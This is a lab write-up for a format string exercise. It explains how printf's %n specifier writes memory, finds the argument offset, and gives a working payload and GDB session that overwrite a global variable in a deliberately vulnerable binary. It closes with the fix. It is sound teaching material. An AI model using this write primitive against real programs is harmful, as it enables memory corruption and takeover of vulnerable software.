# ex07 — Format String to Overwrite a Global Variable

## Goal

Use a format string vulnerability to overwrite the global variable `target` at `0x080496e4` with the value `0x40` (64):

```
you have modified the target :)
```

## Concept

A **format string vulnerability** occurs when user input is passed directly as the format string argument to `printf()` (or similar functions). The attacker can:

1. **Read memory** using `%x`, `%s`, `%p` to leak stack contents.
2. **Write memory** using `%n`, which writes the number of characters printed so far to an address pointed to by an argument.

### How `printf()` format specifiers work

| Specifier | Meaning |
|---|---|
| `%x` | Print an argument as hexadecimal (reads from stack) |
| `%s` | Print a string at an address (reads from memory) |
| `%n` | **Write** the count of characters printed so far to an address (writes to memory!) |
| `%<N>$` | Access the Nth argument directly (positional) |

### Why `printf(user_input)` is dangerous

When `printf()` encounters `%n`, it expects a pointer argument and writes to it. If we control the format string, we can:
- Use `%<N>$` to select a specific argument (which can be an address we placed on the stack)
- Use `%n` to write to that address
- Use `%<N>x` to control how many characters are printed (controlling the value written)

## Memory Layout

```
Higher addresses
┌─────────────────────────────┐
│  target (4 bytes)           │  0x080496e4  ← global variable, must be 0x40
├─────────────────────────────┤
│  ...                        │
├─────────────────────────────┤
│  buffer (520 bytes)         │  [ebp-0x208] ← fgets reads here, then printf(buffer)
├─────────────────────────────┤
│  ...                        │
Lower addresses
```

## Relevant Assembly (`vuln`)

```asm
08048454 <vuln>:
    push   ebp
    mov    ebp, esp
    sub    esp, 0x218                 ; allocate 536 bytes

    mov    eax, ds:0x80496d8          ; eax = stdin
    mov    DWORD PTR [esp+0x8], eax   ; arg3 = stdin
    mov    DWORD PTR [esp+0x4], 0x200 ; arg2 = 512 (max bytes)
    lea    eax, [ebp-0x208]           ; eax = &buffer[0]
    mov    DWORD PTR [esp], eax       ; arg1 = buffer
    call   fgets                      ; fgets(buffer, 512, stdin) — SAFE read

    lea    eax, [ebp-0x208]           ; eax = buffer
    mov    DWORD PTR [esp], eax       ; arg1 = buffer
    call   printf                     ; printf(buffer) — VULNERABLE!

    mov    eax, ds:0x80496e4         ; eax = target
    cmp    eax, 0x40                  ; compare with 64
    jne    ...                        ; if not equal, fail
```

### Step-by-step analysis

| Instruction | What it does |
|---|---|
| `call fgets` | Safely reads up to 511 bytes into buffer |
| `call printf` | **Vulnerable**: treats buffer as format string |
| `cmp eax, 0x40` | Checks if target equals 64 |

## Finding the Argument Index

To exploit a format string, we need to find where our input appears as a `printf()` argument. We send a marker and search for it:

```bash
printf 'AAAA%%4$x\n' | ./bin
# Output: ... 41414141 ...
# This shows "AAAA" (0x41414141) appears at the 4th argument position
```

The input buffer starts at **printf argument 4**.

## Exploit

We need to write `0x40` (64) to address `0x080496e4`:

```bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(struct.pack("<I",0x080496e4)+b"%60x%4$n"+b"\n")' | ./bin
```

### Why it works

Let's break down the payload:

1. **`struct.pack("<I", 0x080496e4)`**: Places the address `0x080496e4` (4 bytes) at the start of the buffer. This becomes printf argument 4.

2. **`%60x`**: Prints 60 characters (padding with spaces). Combined with the 4 address bytes, the running count is now 64.

3. **`%4$n`**: Takes the 4th argument (the address `0x080496e4`) and writes the current character count (64 = `0x40`) to that address.

### Detailed execution

```
Step 1: printf encounters the 4 address bytes
        → Prints 4 non-printable characters (or spaces)
        → Running count: 4

Step 2: printf encounters "%60x"
        → Prints a number padded to 60 characters
        → Running count: 4 + 60 = 64

Step 3: printf encounters "%4$n"
        → Argument 4 is the address 0x080496e4
        → Writes 64 (0x40) to that address
        → target is now 0x40
```

## GDB Verification

```bash
gdb -q ./bin
```

```gdb
# Break at the vulnerable printf call
break *0x08048485
run < <(python3 -c 'import sys,struct; sys.stdout.buffer.write(struct.pack("<I",0x080496e4)+b"%60x%4$n"+b"\n")')

# Check target before the write
x/wx 0x080496e4
# Output: 0x00000000 (or whatever initial value)

# Step into printf to see the write happen
stepi
# (continue stepping or continue to end)

# Check target after
x/wx 0x080496e4
# Output: 0x00000040

# Continue to see success
continue
```

### Alternative: debugging the argument index

```bash
gdb -q ./bin
```

```gdb
# Break at printf
break *0x08048485
run < <(printf 'AAAA%%x.%%x.%%x.%%x.%%x.\n')

# Examine stack arguments to printf
x/8xw $esp
# Look for 0x41414141 in the output
# It should appear at the 4th argument position
```

## Key Takeaway

Format string vulnerabilities are extremely powerful because they allow both **reading** and **writing** arbitrary memory. The `%n` specifier is the key to writing. The fix is simple: **never pass user input as the format string**. Always use `printf("%s", user_input)` instead of `printf(user_input)`.
